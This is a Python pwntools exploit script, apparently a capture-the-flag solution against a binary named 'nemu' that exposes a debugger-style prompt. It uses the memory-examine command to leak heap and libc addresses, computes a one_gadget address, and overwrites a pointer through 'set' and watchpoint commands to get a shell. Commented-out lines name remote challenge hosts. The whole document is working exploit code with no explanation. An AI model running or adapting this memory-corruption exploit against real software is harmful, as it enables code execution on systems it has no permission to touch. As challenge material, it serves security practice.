# _*_ coding:utf-8 _*_
from pwn import *

context.terminal=['tmux', 'splitw', '-h']

prog = './nemu'
p = process(prog)
# p = remote("47.107.29.210", 36088)#nc 124.71.130.185 49155
# p = remote("127.0.0.1", 9999)#nc 124.71.130.185 49155
context.log_level = 'debug'

def choice(idx):
    p.sendlineafter("> ",str(idx))

def add(sz,con):
    choice(1)
    sleep(0.1)
    p.sendline(str(sz))
    sleep(0.1)
    p.sendline(con)
    # sa("content?",cno)

def delete(idx):
    choice(2)
    sleep(0.1)
    p.sendline(str(idx))

def exp():
    pool = 0x6a3b80
    p.sendlineafter("(nemu) ",'x 5 '+str(8000030))
    p.recvuntil("0x08000040\t0x")
    heap = int(p.recv(8),16)
    print("[++++++++++]",heap)
    #                                       #

    p.sendlineafter("(nemu) ",'x 10 '+hex(0x3d8+heap-pool)[2:])
    p.recvuntil("\t0x")
    l1 = int(p.recv(8),16)
    print("[++++++++++]",hex(l1))
    p.recvuntil("\t0x")
    l2 = int(p.recv(8),16)
    print("[++++++++++]",hex(l2))
    libcof = l1+l2*0x100000000
    #                                       #
    addr = libcof - 0x3c4ce8
    print("[++++++++++]",hex(addr))
    og = addr + 0x4527a
    
    p.sendlineafter("(nemu) ",'set '+ str(0x86A3FC0-pool) + ' ' + '0x60f078')
    p.sendlineafter("(nemu) ",'set '+ str(0x86A3FC0-pool+4) + ' ' + str((0x60f078)>>32))
    p.sendlineafter("(nemu) ",'w 0x'+hex(og)[6:])

    p.interactive()

exp()